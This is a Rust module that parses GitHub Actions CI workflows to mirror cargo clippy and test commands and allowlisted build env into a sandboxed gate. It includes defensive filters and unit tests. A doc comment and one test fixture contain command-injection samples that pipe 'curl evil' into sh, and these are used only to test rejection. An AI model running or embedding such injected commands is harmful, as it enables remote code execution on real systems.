//! ADR-0004 GitHub Actions workflow parser.
//!
//! Bellows's cargo-checks gate mirrors the target repo's CI clippy /
//! test commands by reading `.github/workflows/*.yml` at workspace
//! prepare time. This module owns the read + extract step: find the
//! workflow named `CI`, locate the first `cargo clippy` and
//! `cargo test` invocations in a Linux-runner job's steps, return them
//! as complete command strings.
//!
//! Failure is always silent — a missing workflow, malformed YAML, or
//! commands wrapped in a shell script the parser can't follow all
//! produce `None` for the affected command. The caller (the
//! workspace prepare path) then falls back to operator-declared
//! `[gates].*_flags` defaults from `orchestrator.toml`. There is no
//! recoverable error type because parsing fallback is the operational
//! safety net that lets bellows keep running against any target repo.

use std::collections::BTreeMap;
use std::path::{Path, PathBuf};

use yaml_rust2::{Yaml, YamlLoader};

/// Commands bellows extracted from the target repo's CI workflow,
/// alongside provenance for the operator-visible run-log line.
///
/// `clippy` / `test` are `None` when bellows could not extract a
/// literal `cargo clippy ...` / `cargo test ...` line — the caller
/// substitutes a fallback from `Config.gates` for any `None` field.
///
/// `clippy_env` / `test_env` carry the build-relevant environment the
/// CI step ran that command under (issue #180). Sorted by name for a
/// deterministic gate posture, and empty when the workflow declared
/// none. The env travels *with* its command because a repo can split
/// clippy and test into sibling jobs whose env blocks differ.
///
/// `source` reports whether at least one command was extracted from a
/// workflow file (`ParsedFromWorkflow(path)`) or none were
/// (`FallbackFromConfig`). It is the file-level provenance, not the
/// per-command one; the caller can compare each field against its
/// fallback value to attribute provenance per command if needed.
/// `clippy_check` / `test_check` name the CI *job* each command was
/// extracted from (issue #196 follow-up). GitHub names a check-run after
/// the job, never the step, so this — not the command string — is what
/// the base-commit-health lookup can match against
/// `GET /commits/{sha}/check-runs`. `None` whenever the command itself is
/// `None`: with no mirrored command there is no check to attribute.
#[derive(Debug, Default, Clone, PartialEq, Eq)]
pub struct ExtractedCommands {
    pub clippy: Option<String>,
    pub clippy_env: Vec<(String, String)>,
    pub clippy_check: Option<String>,
    pub test: Option<String>,
    pub test_env: Vec<(String, String)>,
    pub test_check: Option<String>,
    pub source: Provenance,
}

/// Where a gate command came from. Surfaced in the run-log line so an
/// operator reading the pipeline output can tell whether bellows
/// mirrored CI verbatim or fell back to the operator-declared default.
#[derive(Debug, Default, Clone, PartialEq, Eq)]
pub enum Provenance {
    /// Bellows extracted the command from the named workflow file.
    /// The `PathBuf` carries the actual file (e.g.
    /// `.github/workflows/ci.yml`) for log attribution.
    ParsedFromWorkflow(PathBuf),
    /// Bellows could not parse a literal command from any workflow
    /// file and the caller will substitute the operator-declared
    /// `[gates].*_flags` default.
    #[default]
    FallbackFromConfig,
}

/// Walk `repo_root/.github/workflows/*.yml` and `.yaml`, find the
/// workflow whose top-level `name:` is `CI`, and extract the first
/// `cargo clippy ...` and `cargo test ...` lines from its Linux-runner
/// job's steps. Returns `ExtractedCommands::default()` when no such
/// workflow exists, when the YAML cannot be parsed, or when no literal
/// `cargo clippy` / `cargo test` step is found.
///
/// Never errors — every failure mode (missing directory, EACCES on
/// `.github/`, unreadable yaml file, malformed yaml, no Linux job,
/// no cargo clippy / test line) is downgraded to
/// `ExtractedCommands::default()` so the cargo-checks gate falls back
/// to the operator-declared `[gates].*_flags` default. The return
/// type reflects the contract: a Result here would imply a failure
/// mode the caller must handle, but there is none — fallback IS the
/// failure mode.
pub fn parse_ci_workflow(repo_root: &Path) -> ExtractedCommands {
    let dir = repo_root.join(".github").join("workflows");
    let Ok(entries) = std::fs::read_dir(&dir) else {
        return ExtractedCommands::default();
    };

    // Collect workflow file paths in a deterministic order so the
    // verdict doesn't flap across filesystems that don't enumerate
    // directories in a consistent order.
    let mut workflow_paths: Vec<PathBuf> = Vec::new();
    for entry in entries.flatten() {
        let path = entry.path();
        let is_yaml = path
            .extension()
            .and_then(|e| e.to_str())
            .is_some_and(|e| e.eq_ignore_ascii_case("yml") || e.eq_ignore_ascii_case("yaml"));
        if is_yaml {
            workflow_paths.push(path);
        }
    }
    workflow_paths.sort();

    for path in &workflow_paths {
        // Skip anything that isn't a regular file. A target repo can
        // commit a symlink under `.github/workflows/` (git preserves
        // mode 120000) pointing to an arbitrary host path —
        // `/etc/passwd`, a deploy key, a FIFO — and `read_to_string`
        // would follow the link on the bellows host. `symlink_metadata`
        // does NOT follow the link, so any symlink (regardless of
        // target), FIFO, socket, or directory entry is filtered out
        // before any read.
        let Ok(meta) = std::fs::symlink_metadata(path) else {
            continue;
        };
        if !meta.file_type().is_file() {
            continue;
        }
        let Ok(content) = std::fs::read_to_string(path) else {
            continue;
        };
        // A UTF-8 BOM survives `read_to_string` into the string, and the
        // YAML loader reads it as part of the first scalar — so the
        // top-level key becomes `\u{feff}name` and the `name: CI` check
        // below silently rejects the file. The whole workflow then falls
        // back to `[gates].*_flags`, which is how a Windows-authored
        // `ci.yml` got a repo gated on `-D warnings` its own CI does not
        // apply, and failed a run on 426 pre-existing lints in files the
        // agent never touched. One invisible byte, one misattributed run.
        let content = content.strip_prefix('\u{feff}').unwrap_or(&content);
        let docs = match YamlLoader::load_from_str(content) {
            Ok(d) => d,
            Err(_) => continue,
        };
        let Some(doc) = docs.first() else { continue };
        if doc["name"].as_str() != Some("CI") {
            continue;
        }
        let extracted = extract_from_workflow(doc);
        if extracted.clippy.is_some() || extracted.test.is_some() {
            return ExtractedCommands {
                clippy: extracted.clippy,
                clippy_env: extracted.clippy_env,
                clippy_check: extracted.clippy_check,
                test: extracted.test,
                test_env: extracted.test_env,
                test_check: extracted.test_check,
                source: Provenance::ParsedFromWorkflow(path.clone()),
            };
        }
        // Workflow named CI but no literal cargo clippy / test line —
        // treat identically to "no workflow" so both commands fall
        // back to config.
        return ExtractedCommands::default();
    }

    ExtractedCommands::default()
}

/// Walk a parsed workflow's `jobs.*` map and extract the clippy and
/// test commands CI runs. Accumulates the two commands *independently*
/// across all Linux-runner jobs in declaration order — taking the first
/// `cargo clippy` line found and the first `cargo test` line found, even
/// when they live in separate jobs.
///
/// A dedicated `clippy:` job alongside a `test:` job is an idiomatic CI
/// shape. Stopping at the first job that yields *either* command (the
/// pre-fix behaviour) grabbed `cargo test` from the `test:` job and
/// returned before ever reading the `clippy:` job, so clippy fell back
/// to the `[gates]` default `-D warnings` — over-strict relative to a
/// repo whose CI scopes clippy to `-D clippy::correctness
/// -D clippy::suspicious`, false-failing every PR. ADR-0004 requires the
/// gate to mirror the target's *actual* clippy scope, so we must keep
/// looking for each command across sibling jobs.
///
/// What one workflow (or one job) yielded: each command plus the
/// build-relevant env of the step that ran it (issue #180).
#[derive(Debug, Default, Clone, PartialEq, Eq)]
struct JobExtract {
    clippy: Option<String>,
    clippy_env: Vec<(String, String)>,
    clippy_check: Option<String>,
    test: Option<String>,
    test_env: Vec<(String, String)>,
    test_check: Option<String>,
}

/// Environment-variable names bellows mirrors from the target repo's CI
/// into its cargo-checks gate (issue #180).
///
/// **Allowlist, not denylist** — the gate must reproduce CI's *build
/// posture*, never its secrets. A workflow's `env:` block routinely
/// carries tokens and deploy keys (`${{ secrets.* }}`), and forwarding
/// those into the gate container would hand the target repo's
/// credentials to a sandbox that has no need for them. Only names that
/// tune the Rust build are eligible; everything else — including
/// anything bellows has never heard of — is dropped.
///
/// The motivating case (#180): `workboard-financial-advice` sets
/// `CARGO_PROFILE_TEST_DEBUG: "0"` on its clippy and test steps as a
/// documented linker-OOM guard. Bellows mirrored the *command* but not
/// that env, so the gate linked its test binaries with full
/// `debuginfo=2`, got OOM-killed (`ld terminated with signal 9`), and
/// reported a false `FinalTestsRed` on code the repo's own CI passes.
fn is_build_relevant_env_name(name: &str) -> bool {
    const EXACT: [&str; 7] = [
        "CARGO_INCREMENTAL",
        "CARGO_NET_GIT_FETCH_WITH_CLI",
        "CARGO_TERM_COLOR",
        "RUSTFLAGS",
        "RUSTDOCFLAGS",
        "RUST_BACKTRACE",
        "RUST_MIN_STACK",
    ];
    // `CARGO_PROFILE_*` covers the whole profile surface
    // (CARGO_PROFILE_TEST_DEBUG, _RELEASE_LTO, _DEV_OPT_LEVEL, ...);
    // `CARGO_BUILD_*` covers jobs/target/rustflags.
    const PREFIXES: [&str; 2] = ["CARGO_PROFILE_", "CARGO_BUILD_"];
    EXACT.contains(&name) || PREFIXES.iter().any(|p| name.starts_with(p))
}

/// Whether an env value is safe to embed in the gate command string.
///
/// The composed command is handed to `sh -c` inside the sandbox, and
/// bellows single-quotes each value, so the only character that could
/// break out of the quoting is a single quote itself. Newlines are
/// rejected for the same reason, and `${{` marks an unresolved GitHub
/// Actions expression (a secret or matrix reference) that bellows cannot
/// evaluate and must never pass through literally.
///
/// Rejected values are dropped individually — the command still runs,
/// just without that one env entry, which is strictly closer to CI than
/// today's behaviour of dropping every env entry.
fn env_value_is_safe(value: &str) -> bool {
    !value.contains('\'')
        && !value.contains('\n')
        && !value.contains('\r')
        && !value.contains("${{")
}

/// Merge the allowlisted entries of `container["env"]` into `out`.
/// Later calls override earlier ones, which is how GitHub Actions
/// layers workflow-level → job-level → step-level `env:`.
fn collect_build_env(container: &Yaml, out: &mut BTreeMap<String, String>) {
    let Some(env) = container["env"].as_hash() else {
        return;
    };
    for (key, value) in env {
        let Some(name) = key.as_str() else { continue };
        if !is_build_relevant_env_name(name) {
            continue;
        }
        // Scalars only. `CARGO_PROFILE_TEST_DEBUG: "0"` parses as a
        // String; the unquoted `0` / `true` forms parse as Integer /
        // Boolean, so normalise those rather than dropping them.
        let rendered = match value {
            Yaml::String(s) => s.clone(),
            Yaml::Integer(i) => i.to_string(),
            Yaml::Boolean(b) => b.to_string(),
            Yaml::Real(r) => r.clone(),
            _ => continue,
        };
        if !env_value_is_safe(&rendered) {
            continue;
        }
        out.insert(name.to_string(), rendered);
    }
}

/// When no job runs on a Linux runner, falls back to the first declared
/// job — the matrix-without-ubuntu shape.
fn extract_from_workflow(doc: &Yaml) -> JobExtract {
    let Some(jobs) = doc["jobs"].as_hash() else {
        return JobExtract::default();
    };
    // Workflow-level `env:` is the base layer every job inherits.
    let mut workflow_env = BTreeMap::new();
    collect_build_env(doc, &mut workflow_env);
    let mut linux_jobs: Vec<(String, &Yaml)> = Vec::new();
    let mut first_job: Option<(String, &Yaml)> = None;
    for (key, body) in jobs {
        let check = job_check_name(key, body);
        if first_job.is_none() {
            first_job = Some((check.clone(), body));
        }
        if job_is_linux(body) {
            linux_jobs.push((check, body));
        }
    }
    // No Linux job at all — matrix-without-ubuntu shape: fall back to the
    // first declared job so a workflow whose only runner is expressed via
    // an unresolvable `runs-on` still extracts.
    if linux_jobs.is_empty() {
        return match first_job {
            Some((check, job)) => attribute(extract_from_job(job, &workflow_env), &check),
            None => JobExtract::default(),
        };
    }
    // Accumulate clippy and test INDEPENDENTLY across every Linux job in
    // declaration order. Take the first clippy found and the first test
    // found, wherever each lives — a repo may split them into separate
    // `clippy:` / `test:` jobs, and returning at the first job to yield
    // either command would drop the other and force a `-D warnings`
    // fallback for it.
    let mut acc = JobExtract::default();
    for (check, job) in &linux_jobs {
        let found = attribute(extract_from_job(job, &workflow_env), check);
        // Each command carries its own env and its own job, so all three
        // must move together — a repo that splits clippy and test into
        // sibling jobs has a different check-run name for each.
        if acc.clippy.is_none() {
            acc.clippy = found.clippy;
            acc.clippy_env = found.clippy_env;
            acc.clippy_check = found.clippy_check;
        }
        if acc.test.is_none() {
            acc.test = found.test;
            acc.test_env = found.test_env;
            acc.test_check = found.test_check;
        }
        if acc.clippy.is_some() && acc.test.is_some() {
            break;
        }
    }
    acc
}

/// Tag whichever commands a job yielded with that job's check-run name.
/// A command the job did not yield stays unattributed, so a later job in
/// the accumulation loop can claim it.
fn attribute(mut found: JobExtract, check: &str) -> JobExtract {
    found.clippy_check = found.clippy.as_ref().map(|_| check.to_string());
    found.test_check = found.test.as_ref().map(|_| check.to_string());
    found
}

/// The name GitHub will give this job's check-run: the job's `name:` if
/// it declares one, otherwise the `jobs.<key>` key itself.
///
/// This is the whole point of the lookup working at all. GitHub names a
/// check-run after the job, so a workflow whose steps are named
/// `cargo clippy` and `cargo test` still reports a single check called
/// `ci`. Matching the *command* against check-run names — which is what
/// bellows did before — could therefore never match anything, and the
/// base-health lookup returned `NotEstablished` on every repo while its
/// unit tests passed against fixtures that named check-runs after steps.
fn job_check_name(key: &Yaml, body: &Yaml) -> String {
    if let Some(name) = body["name"].as_str() {
        let trimmed = name.trim();
        if !trimmed.is_empty() {
            return trimmed.to_string();
        }
    }
    key.as_str().unwrap_or_default().trim().to_string()
}

/// Whether a `jobs.<name>` body runs on a Linux runner. Accepts a
/// literal `runs-on: ubuntu-*` string or a `runs-on: ${{ matrix.os }}`
/// reference whose backing matrix array contains any `ubuntu-*` entry.
fn job_is_linux(job: &Yaml) -> bool {
    let runs_on = &job["runs-on"];
    if let Some(s) = runs_on.as_str() {
        if is_ubuntu_runner(s) {
            return true;
        }
        if let Some(key) = matrix_reference_key(s) {
            return matrix_axis_has_ubuntu(job, &key);
        }
        return false;
    }
    if let Some(arr) = runs_on.as_vec() {
        return arr
            .iter()
            .any(|v| v.as_str().is_some_and(is_ubuntu_runner));
    }
    false
}

fn is_ubuntu_runner(s: &str) -> bool {
    s.trim().starts_with("ubuntu")
}

/// Recognise `${{ matrix.<key> }}` interpolation in a `runs-on:`
/// scalar. Returns `<key>` if the scalar is a matrix reference, else
/// None.
fn matrix_reference_key(s: &str) -> Option<String> {
    let trimmed = s.trim();
    let inner = trimmed
        .strip_prefix("${{")?
        .strip_suffix("}}")?
        .trim();
    let key = inner.strip_prefix("matrix.")?;
    if key.is_empty() {
        return None;
    }
    Some(key.to_string())
}

/// Whether `job.strategy.matrix.<key>` is an array containing at
/// least one `ubuntu-*` string. Defensive — returns false for any
/// missing or non-array shape.
fn matrix_axis_has_ubuntu(job: &Yaml, key: &str) -> bool {
    let axis = &job["strategy"]["matrix"][key];
    let Some(arr) = axis.as_vec() else {
        return false;
    };
    arr.iter().any(|v| v.as_str().is_some_and(is_ubuntu_runner))
}

/// Walk a job's `steps` array and return the first `cargo clippy` and
/// `cargo test` lines found. Steps with non-`run` payloads (e.g.
/// `uses:` action invocations) are skipped. Multi-line `run:` bodies
/// are scanned line-by-line so a step that prefixes with `set -e` or
/// a `cargo build` doesn't suppress extraction of a later
/// `cargo clippy` line in the same step. Shell backslash line
/// continuations are reconstituted before matching so a cargo
/// invocation split across physical lines is captured as the full
/// logical command bellows runs under `sh -c`.
///
/// Each captured command also carries the build-relevant env in scope
/// for its step (issue #180), layered workflow → job → step so the
/// nearest declaration wins — the same precedence GitHub Actions
/// applies.
fn extract_from_job(job: &Yaml, workflow_env: &BTreeMap<String, String>) -> JobExtract {
    let mut out = JobExtract::default();
    let Some(steps) = job["steps"].as_vec() else {
        return out;
    };
    let mut job_env = workflow_env.clone();
    collect_build_env(job, &mut job_env);
    for step in steps {
        let Some(run) = step["run"].as_str() else {
            continue;
        };
        let mut step_env = job_env.clone();
        collect_build_env(step, &mut step_env);
        for line in collapse_backslash_continuations(run) {
            let trimmed = line.trim();
            if out.clippy.is_none()
                && let Some(cmd) = match_cargo_command(trimmed, "clippy")
            {
                out.clippy = Some(cmd);
                out.clippy_env = step_env.clone().into_iter().collect();
            }
            if out.test.is_none()
                && let Some(cmd) = match_cargo_command(trimmed, "test")
            {
                out.test = Some(cmd);
                out.test_env = step_env.clone().into_iter().collect();
            }
            if out.clippy.is_some() && out.test.is_some() {
                return out;
            }
        }
    }
    out
}

/// Collapse shell-style backslash continuations within a multi-line
/// `run:` block into logical lines. A physical line whose trimmed text
/// ends with a single trailing `\` is joined to the next physical line
/// with the `\` dropped and a single space separating the segments —
/// the same transformation `sh` would apply when executing the
/// captured command. Without this step a `run: |` block that splits
/// `cargo clippy ...` across physical lines would be captured as
/// `cargo clippy \` and the gate would silently run `cargo clippy`
/// with no flags, breaking the "gate passes ⇒ CI passes" invariant
/// the cargo-checks mirror is meant to guarantee.
fn collapse_backslash_continuations(run: &str) -> Vec<String> {
    let mut out: Vec<String> = Vec::new();
    let mut acc: Option<String> = None;
    for line in run.lines() {
        let trimmed_end = line.trim_end();
        if let Some(prefix) = trimmed_end.strip_suffix('\\') {
            let segment = prefix.trim_end();
            match &mut acc {
                Some(a) => {
                    a.push(' ');
                    a.push_str(segment.trim_start());
                }
                None => acc = Some(segment.to_string()),
            }
        } else {
            match acc.take() {
                Some(mut a) => {
                    a.push(' ');
                    a.push_str(trimmed_end.trim_start());
                    out.push(a);
                }
                None => out.push(trimmed_end.to_string()),
            }
        }
    }
    if let Some(a) = acc {
        // Dangling backslash at end of run block — keep the
        // accumulated prefix so a malformed-but-recognisable invocation
        // still surfaces as a non-empty captured command rather than
        // being silently dropped.
        out.push(a);
    }
    out
}

/// Match a trimmed line against `cargo <subcommand>` and return the
/// whole line as the captured command. Returns `None` for lines that
/// embed the subcommand inside a shell wrapper (e.g.
/// `./scripts/run-clippy.sh`), inside a quoted argument, or that
/// chain another command before it (e.g. `cargo build && cargo
/// clippy ...`) — those legitimately produce `None` and the caller
/// falls back to config for that command.
///
/// Also returns `None` when the captured line contains shell control
/// operators outside cargo's own argument grammar — `;`, `&&`, `||`,
/// backticks, `$(`, or an unbalanced `"` / `'` quote. The cargo-checks
/// gate hands the captured command to `sh -c` inside the sandbox to
/// mirror GitHub Actions' shell semantics; a workflow step shaped
/// like `cargo clippy --all-targets ; curl evil | sh` would otherwise
/// be eval'd verbatim by the sandbox. These shapes never occur in a
/// legitimate cargo clippy/test invocation, so rejecting them lets
/// the caller substitute the operator-declared `[gates].*_flags`
/// fallback while still mirroring CI for ordinary workflows.
fn match_cargo_command(line: &str, subcommand: &str) -> Option<String> {
    let prefix = format!("cargo {}", subcommand);
    let matched = if line == prefix {
        line
    } else {
        // Require a whitespace boundary after the subcommand so e.g.
        // `cargo testify` does not match `cargo test`.
        let with_space = format!("{} ", prefix);
        if line.starts_with(&with_space) {
            line
        } else {
            return None;
        }
    };
    if has_shell_control_operators(matched) {
        return None;
    }
    Some(matched.to_string())
}

/// Whether `line` contains a shell control operator that cargo's own
/// argument grammar would never produce: a command separator (`;`),
/// boolean chain (`&&` / `||`), backtick command substitution, `$(`
/// command substitution, or an unbalanced single- or double-quote.
///
/// This is a conservative shape filter, not a sh parser. False
/// positives are fine — a workflow that legitimately needs one of
/// these shapes (very unusual for clippy/test) simply falls back to
/// the operator-declared `[gates].*_flags` default, which preserves
/// the gate's correctness guarantee. False negatives would be the
/// problem, so the list is restricted to operators that can chain a
/// second command after the cargo invocation; pipe-to-stdin (`|`) and
/// background (`&` alone) are excluded because they can appear inside
/// quoted cargo arguments and are not, on their own, a way to inject
/// a second command.
fn has_shell_control_operators(line: &str) -> bool {
    if line.contains(';')
        || line.contains("&&")
        || line.contains("||")
        || line.contains('`')
        || line.contains("$(")
    {
        return true;
    }
    let double_quotes = line.bytes().filter(|&b| b == b'"').count();
    let single_quotes = line.bytes().filter(|&b| b == b'\'').count();
    double_quotes % 2 != 0 || single_quotes % 2 != 0
}

#[cfg(test)]
mod tests {
    use super::*;

    fn doc(yaml: &str) -> Yaml {
        YamlLoader::load_from_str(yaml)
            .unwrap()
            .into_iter()
            .next()
            .unwrap()
    }

    #[test]
    fn extracts_clippy_and_test_from_separate_linux_jobs() {
        // Regression (ADR-0004): a repo with a dedicated `clippy:` job
        // separate from the `test:` job. The parser must mirror BOTH
        // commands. The pre-fix parser stopped at the first job to yield
        // either command (test), returned early, and let clippy fall back
        // to `-D warnings` — false-failing every PR against a repo whose
        // CI scopes clippy to correctness+suspicious.
        let d = doc(
"name: CI
on: [push]
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - run: cargo test --locked --workspace --all-features
  clippy:
    runs-on: ubuntu-latest
    steps:
      - run: cargo clippy --locked --workspace --all-targets --all-features -- -D clippy::correctness -D clippy::suspicious
",
        );
        let got = extract_from_workflow(&d);
        assert_eq!(
            got.clippy.as_deref(),
            Some("cargo clippy --locked --workspace --all-targets --all-features -- -D clippy::correctness -D clippy::suspicious"),
            "clippy must be mirrored from the separate `clippy:` job, not fall back to -D warnings",
        );
        assert_eq!(
            got.test.as_deref(),
            Some("cargo test --locked --workspace --all-features"),
        );
    }

    #[test]
    fn extracts_both_from_a_single_job_unchanged() {
        // A workflow with clippy and test in one job still extracts both.
        let d = doc(
"name: CI
on: [push]
jobs:
  ci:
    runs-on: ubuntu-latest
    steps:
      - run: cargo test --all-features
      - run: cargo clippy --all-targets -- -D warnings
",
        );
        let got = extract_from_workflow(&d);
        assert_eq!(got.clippy.as_deref(), Some("cargo clippy --all-targets -- -D warnings"));
        assert_eq!(got.test.as_deref(), Some("cargo test --all-features"));
        assert!(
            got.clippy_env.is_empty() && got.test_env.is_empty(),
            "a workflow declaring no env must lift none (issue #180: no behaviour change)",
        );
    }

    #[test]
    fn clippy_only_workflow_still_extracts_clippy() {
        // A repo with only a `clippy:` job (no cargo test line anywhere)
        // extracts clippy and leaves test None for config fallback.
        let d = doc(
"name: CI
on: [push]
jobs:
  clippy:
    runs-on: ubuntu-latest
    steps:
      - run: cargo clippy --all-targets --all-features -- -D clippy::correctness
",
        );
        let got = extract_from_workflow(&d);
        assert_eq!(
            got.clippy.as_deref(),
            Some("cargo clippy --all-targets --all-features -- -D clippy::correctness"),
        );
        assert_eq!(got.test, None);
    }

    // ---- Issue #180: mirror CI's build env, not just its command ----

    #[test]
    fn lifts_step_level_cargo_profile_env_from_fa_shaped_workflow() {
        // The exact shape that produced the false FinalTestsRed on
        // workboard-financial-advice #46/#280: sibling `test:` and
        // `clippy:` jobs, each setting the linker-OOM guard on the STEP.
        let d = doc(
"name: CI
on: [push]
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: cargo test
        env:
          CARGO_NET_GIT_FETCH_WITH_CLI: \"true\"
          CARGO_PROFILE_TEST_DEBUG: \"0\"
        run: cargo test --locked --workspace --lib --bins --tests --all-features
  clippy:
    runs-on: ubuntu-latest
    steps:
      - name: cargo clippy
        env:
          CARGO_PROFILE_TEST_DEBUG: \"0\"
        run: cargo clippy --locked --workspace --all-targets --all-features -- -D clippy::correctness
",
        );
        let got = extract_from_workflow(&d);
        assert_eq!(
            got.test_env,
            vec![
                ("CARGO_NET_GIT_FETCH_WITH_CLI".to_string(), "true".to_string()),
                ("CARGO_PROFILE_TEST_DEBUG".to_string(), "0".to_string()),
            ],
            "the test step's OOM guard must be mirrored into the gate",
        );
        assert_eq!(
            got.clippy_env,
            vec![("CARGO_PROFILE_TEST_DEBUG".to_string(), "0".to_string())],
            "env travels with its own command across sibling jobs",
        );
    }

    #[test]
    fn never_lifts_secrets_or_unresolved_expressions() {
        // Allowlist contract: a workflow env block routinely carries
        // tokens. None of these may reach the gate container.
        let d = doc(
"name: CI
on: [push]
env:
  GITHUB_TOKEN: hunter2
  AWS_SECRET_ACCESS_KEY: hunter2
  MY_DEPLOY_KEY: hunter2
  CARGO_PROFILE_TEST_DEBUG: \"0\"
jobs:
  ci:
    runs-on: ubuntu-latest
    env:
      RUSTFLAGS: ${{ secrets.SNEAKY }}
    steps:
      - run: cargo test --all-features
",
        );
        let got = extract_from_workflow(&d);
        assert_eq!(
            got.test_env,
            vec![("CARGO_PROFILE_TEST_DEBUG".to_string(), "0".to_string())],
            "only allowlisted, resolvable env is lifted; got {:?}",
            got.test_env,
        );
    }

    #[test]
    fn step_env_overrides_job_and_workflow_env() {
        // GitHub precedence: workflow < job < step.
        let d = doc(
"name: CI
on: [push]
env:
  CARGO_INCREMENTAL: \"1\"
  RUST_BACKTRACE: \"0\"
jobs:
  ci:
    runs-on: ubuntu-latest
    env:
      CARGO_INCREMENTAL: \"2\"
    steps:
      - env:
          CARGO_INCREMENTAL: \"3\"
        run: cargo test --all-features
",
        );
        let got = extract_from_workflow(&d);
        assert_eq!(
            got.test_env,
            vec![
                ("CARGO_INCREMENTAL".to_string(), "3".to_string()),
                ("RUST_BACKTRACE".to_string(), "0".to_string()),
            ],
            "nearest declaration must win; workflow-level entries still inherit",
        );
    }

    #[test]
    fn rejects_env_values_that_would_break_out_of_shell_quoting() {
        // The composed command is single-quoted and handed to `sh -c`,
        // so a value containing a quote must be dropped, not embedded.
        let d = doc(
"name: CI
on: [push]
jobs:
  ci:
    runs-on: ubuntu-latest
    steps:
      - env:
          RUSTFLAGS: \"x'; curl evil | sh; echo '\"
          CARGO_INCREMENTAL: \"0\"
        run: cargo test --all-features
",
        );
        let got = extract_from_workflow(&d);
        assert_eq!(
            got.test_env,
            vec![("CARGO_INCREMENTAL".to_string(), "0".to_string())],
            "quote-bearing value must be dropped individually; got {:?}",
            got.test_env,
        );
    }

    #[test]
    fn normalises_unquoted_scalar_env_values() {
        // `CARGO_PROFILE_TEST_DEBUG: 0` (no quotes) parses as an
        // Integer; it must still be mirrored, not silently dropped.
        let d = doc(
"name: CI
on: [push]
jobs:
  ci:
    runs-on: ubuntu-latest
    steps:
      - env:
          CARGO_PROFILE_TEST_DEBUG: 0
          CARGO_NET_GIT_FETCH_WITH_CLI: true
        run: cargo test --all-features
",
        );
        let got = extract_from_workflow(&d);
        assert_eq!(
            got.test_env,
            vec![
                ("CARGO_NET_GIT_FETCH_WITH_CLI".to_string(), "true".to_string()),
                ("CARGO_PROFILE_TEST_DEBUG".to_string(), "0".to_string()),
            ],
        );
    }
}
